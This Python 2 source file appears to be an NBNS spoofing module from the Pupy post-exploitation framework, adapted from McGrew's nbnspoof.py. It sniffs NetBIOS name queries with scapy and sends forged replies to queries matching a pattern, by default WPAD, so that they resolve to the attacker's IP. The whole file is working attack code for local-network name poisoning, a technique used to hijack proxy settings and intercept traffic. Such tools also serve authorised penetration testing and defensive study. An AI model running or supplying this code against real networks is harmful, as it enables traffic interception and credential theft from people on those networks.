#!/usr/bin/env python
# 
# Originaly from :
# nbnspoof.py 03-27-2007 Robert Wesley McGrew
# wesley@mcgrewsecurity.com
# http://mcgrewsecurity.com
# Keeping things simple: You may use this code however you see fit, so 
# long as you give me proper credit.  Email me if you have any
# questions.
# rewritten by Nicolas VERDIER for pupy

import sys
import re
from scapy.all import *


def pack_ip(addr):
   temp = IP(src=addr)
   return str(temp)[0x0c:0x10]

def unpack_ip(bin):
   temp = IP()
   temp = str(temp)[:0x0c] + bin + str(temp)[0x10:]
   temp = IP(temp)
   return temp.src

def config_nbns(ip, mac_addr, regexp, verbose=True, interface=None):
    def get_packet(pkt):

       if not pkt.getlayer(NBNSQueryRequest):
          return

       if pkt.FLAGS & 0x8000:
          query = False
          addr = unpack_ip(str(pkt.getlayer(Raw))[8:])
       else:
          query = True

       if verbose:
          print str(pkt.NAME_TRN_ID) + ":",
          if query:
             print "Q",
          else:
             print "R",
          print "SRC:" + pkt.getlayer(IP).src + " DST:" + pkt.getlayer(IP).dst,
          if query:
             print 'NAME:"' + pkt.QUESTION_NAME + '"'
          else:
             print 'NAME:"' + pkt.QUESTION_NAME + '"',
             print 'IP:' + addr

       if query and regexp.match(pkt.QUESTION_NAME.rstrip(),1):
          response  = Ether(dst=pkt.src,src=mac_addr)
          response /= IP(dst=pkt.getlayer(IP).src,src=ip)
          response /= UDP(sport=137,dport=137)
          response /= NBNSQueryRequest(NAME_TRN_ID=pkt.getlayer(NBNSQueryRequest).NAME_TRN_ID,\
                                      FLAGS=0x8500,\
                                      QDCOUNT=0,\
                                      ANCOUNT=1,\
                                      NSCOUNT=0,\
                                      ARCOUNT=0,\
                                      QUESTION_NAME=pkt.getlayer(NBNSQueryRequest).QUESTION_NAME,\
                                      SUFFIX=pkt.getlayer(NBNSQueryRequest).SUFFIX,\
                                      NULL=0,\
                                      QUESTION_TYPE=pkt.getlayer(NBNSQueryRequest).QUESTION_TYPE,\
                                      QUESTION_CLASS=pkt.getlayer(NBNSQueryRequest).QUESTION_CLASS)
          response /= Raw()
          # Time to live: 3 days, 11 hours, 20 minutes
          response.getlayer(Raw).load += '\x00\x04\x93\xe0' 
          # Data length: 6
          response.getlayer(Raw).load += '\x00\x06'
          # Flags: (B-node, unique)
          response.getlayer(Raw).load += '\x00\x00'
          # The IP we're giving them:
          response.getlayer(Raw).load += pack_ip(ip)
          sendp(response,iface=interface,verbose=0)
          if verbose:
             print 'Sent spoofed reply to #' + str(response.getlayer(NBNSQueryRequest).NAME_TRN_ID)
    return get_packet


def start_nbnsspoof(ip, mac_addr, timeout=600, verbose=True, interface=None, name_regexp=".*WPAD.*"):
    regexp = re.compile(name_regexp,re.IGNORECASE)
    func=config_nbns(ip, mac_addr, regexp, verbose=verbose, interface=interface)
    sniff(iface=interface,filter="udp and port 137", store=0, prn=func, timeout=timeout)


